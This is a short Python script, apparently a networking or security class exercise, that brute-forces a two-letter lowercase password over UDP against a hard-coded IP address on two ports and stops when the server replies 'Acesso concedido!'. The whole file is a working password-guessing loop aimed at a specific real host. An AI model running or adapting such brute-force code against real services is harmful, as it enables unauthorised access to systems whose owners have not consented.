import socket
import time


def main():
    host = '150.164.10.29'
    portas = range(9071, 9073)

    cliente = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    cliente.settimeout(1)

    for porta in portas:
        for letra1 in range(97, 123):
            for letra2 in range(97, 123):
              time.sleep(0.5)

              senha = chr(letra1) + chr(letra2)
              print(f"Tentando a Porta: {porta} e a Senha: {senha}")

              try:
                cliente.sendto(senha.encode(), (host,porta))
                resposta, endereco = cliente.recvfrom(1024)
                resposta = resposta.decode()

                if resposta == "Acesso concedido!":
                  print(f"Senha Correta: {senha} e Porta Correta: {porta}")
                  return

              except ConnectionRefusedError:
                pass

              except BlockingIOError:
                time.sleep(1)
              
              except socket.timeout:
                 print('Sem resposta')


main()
